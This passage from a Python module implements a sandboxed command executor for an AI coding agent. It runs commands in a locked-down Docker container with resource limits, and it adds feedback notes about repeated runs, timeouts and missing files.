                    "You have been told this after each of the last few runs and run "
                    "it again anyway, so it is now withheld rather than repeated.\n\n"
                    "This verification is finished. Either return your structured "
                    "response now, or change a file first - after a write, this "
                    "command runs normally again."
                )
            }
            _record_execution(
                repo_root, role_name, command, outcome, working_directory, category,
                duration_seconds=time.monotonic() - started,
            )
            return outcome

        already_timed_out = 0 if harness else timed_out_this_way_before(repo_root, command, working_directory, category)
        later_sprints = ""
        if already_timed_out:
            outcome = {
                "error": (
                    f"Not running this again: it has already timed out "
                    f"{already_timed_out} time(s) in this run and would time out "
                    "again, which costs the run the whole timeout a second time."
                    + _timeout_advice(repo_root, working_directory)
                )
            }
        else:
            began = time.time()
            outcome = cls._run(
                command, repo_root, role_name, category, extra_env, working_directory
            )
            if not harness and _as_exit_code(outcome.get("returncode")) not in (None, 0):
                later_sprints = _failures_a_later_sprint_owns(repo_root, began)
        notes = [n for n in (redundant_cd, doubled, redirected, _a_missing_path_that_is_here(outcome),
                             _a_relative_path_missing_from_where_it_ran(outcome, repo_root, working_directory),
                             later_sprints) if n]
        if notes:
            outcome = {**outcome, "note": " ".join(notes)}
        regressed = _fewer_pass_than_last_time(
            repo_root, command, working_directory, outcome
        )
        if regressed:
            outcome = {
                **outcome,
                "note": f"{outcome['note']}{regressed}" if outcome.get("note") else regressed.strip(),
            }
        note = _note_about_running_this_again(
            repo_root, command, outcome, role_name, working_directory
        ) or _a_silent_success(outcome)
        if note:
            outcome = {
                **outcome,
                "note": f"{outcome['note']} {note}" if outcome.get("note") else note,
            }
        # On the first failure, not only on a repeat. The repeat note is the
        # cheapest place to notice a wasted call and the most expensive place to
        # learn the answer: by then the call has been paid for twice. What the
        # command was looking for is decidable at the first failure.
        if _as_exit_code(outcome.get("returncode")) not in (None, 0):
            for hint in (
                _where_the_files_it_named_actually_are(
                    repo_root, command, working_directory
                ),
                # The other half of the same question. A failed command either
                # named something the workspace does not have where it looked,
                # or asked a runner for a name the project never declared.
                _the_tasks_this_project_defines(
                    repo_root, command, working_directory
                ),
            ):
                if not hint:
                    continue
                outcome = {
                    **outcome,
                    "note": f"{outcome['note']} {hint}" if outcome.get("note") else hint,
                }
        _record_execution(
            repo_root, role_name, command, outcome, working_directory, category,
            duration_seconds=time.monotonic() - started,
        )
        return outcome

    @classmethod
    def _run(
        cls,
        command: Sequence[str],
        repo_root: str,
        role_name: str = "general",
        category: str = "default",
        extra_env: Dict[str, str] | None = None,
        working_directory: str | None = None,
    ) -> Dict[str, Any]:
        if not execution_enabled():
            return {"error": "Command execution is disabled (ALLOW_COMMAND_EXECUTION is not enabled)."}

        try:
            argv = validate_command(command, role_name, repo_root)
        except CommandNotAllowed as exc:
            return {"error": str(exc)}

        workspace = os.path.abspath(repo_root)
        if not os.path.isdir(workspace):
            return {"error": f"Workspace does not exist: {workspace}"}

        try:
            run_in = resolve_working_directory(workspace, working_directory)
        except WorkingDirectoryRejected as exc:
            return {"error": str(exc)}

        argv = workspace_rooted_arguments(argv, workspace, run_in)

        # Ask what is free before starting, not after the kernel has answered.
        # A refusal is a tool result the model can read and work around; an OOM
        # kill takes the worker with it, and a run whose worker is gone has no
        # process left to write an error. One run ended that way twice.
        from app.tools.resources import enough_headroom, read_resource_state

        state = read_resource_state()
        viable, why = enough_headroom(_memory_limit_bytes(), state)
        if not viable:
            logger.warning(
                "refusing %s: %s", argv[0], state.describe(),
                extra={"sandbox_resource_state": state.describe()},
            )
            return {"error": why}

        timeout = timeout_for(category, repo_root)
        if not running_for_the_harness():
            timeout = after_a_run_that_never_finished(repo_root, argv, working_directory, timeout)

        if execution_mode() == IN_CONTAINER_MODE:
            return cls._execute_here(
                argv, workspace, role_name, category, timeout, extra_env, run_in
            )

        try:
            docker = _docker_binary()
        except SandboxUnavailable as exc:
            return {"error": str(exc)}
        container = f"sandbox-{uuid.uuid4().hex[:12]}"

        docker_cmd = [
            docker, "run", "--rm",
            "--name", container,
            "--network", "bridge" if category in NETWORK_CATEGORIES else "none",
            "--memory", MEMORY_LIMIT,
            "--memory-swap", MEMORY_LIMIT,   # equal to --memory disables swap
            "--cpus", CPU_LIMIT,
            "--pids-limit", PIDS_LIMIT,
            "--cap-drop", "ALL",
            "--security-opt", "no-new-privileges",
            # The workspace is the one writable location; everything else,
            # including /tmp, is ephemeral and size-bounded.
            "--read-only",
            # A tmpfs mount flag for the container, not a host temp path.
            "--tmpfs", "/tmp:rw,noexec,nosuid,size=256m",  # nosec B108
            "-v", f"{workspace}:/workspace",
            # The mount is always the workspace root; only the working directory
            # inside it moves, so a subdirectory still sees its siblings.
            "-w", "/workspace/" + os.path.relpath(run_in, workspace)
            if run_in and os.path.relpath(run_in, workspace) != "."
            else "/workspace",
            "-u", f"{os.getuid()}:{os.getgid()}",
            "--env", "HOME=/tmp",
        ]
        for key, value in (extra_env or {}).items():
            docker_cmd += ["--env", f"{key}={value}"]
        docker_cmd.append(_image_for(os.path.basename(argv[0])))
        docker_cmd.extend(argv)

        logger.info(
            "sandbox exec role=%s category=%s argv=%s", role_name, category, argv,
            extra={"sandbox_container": container},
        )
        try:
            result = subprocess.run(docker_cmd, capture_output=True, text=True, timeout=timeout)
        except subprocess.TimeoutExpired:
            subprocess.run([docker, "kill", container], capture_output=True, check=False)
            return {
                "error": f"Command timed out after {timeout} seconds." + _timeout_advice(workspace, run_in, argv)
            }
        except OSError as exc:
            return {"error": f"Could not start the sandbox: {exc}"}

        return {
            "stdout": _as_workspace_relative(_truncate(result.stdout, f"{role_name}-{argv[0]}-stdout", repo_root), repo_root),
            "stderr": _as_workspace_relative(_truncate(result.stderr, f"{role_name}-{argv[0]}-stderr", repo_root), repo_root),
            "returncode": str(result.returncode),
        }


__all__ = [
    "COMMON_EXECUTABLES",
    "read_execution_ledger",
    "summarise_executions",
    "CONTAINER_MODE",
    "IN_CONTAINER_MODE",
    "CommandNotAllowed",
    "ROLE_EXECUTABLES",
    "SandboxExecutor",
    "SandboxUnavailable",
    "allowed_executables",
    "FRAMEWORK_LANGUAGES",
    "pin_project_stack",
    "project_stack",
    "TOOLCHAINS",
    "TOOLCHAIN_TIMEOUT_SCALE",
    "timeout_for",
    "workspace_rooted_arguments",
    "execution_enabled",
    "execution_mode",
    "validate_command",
]
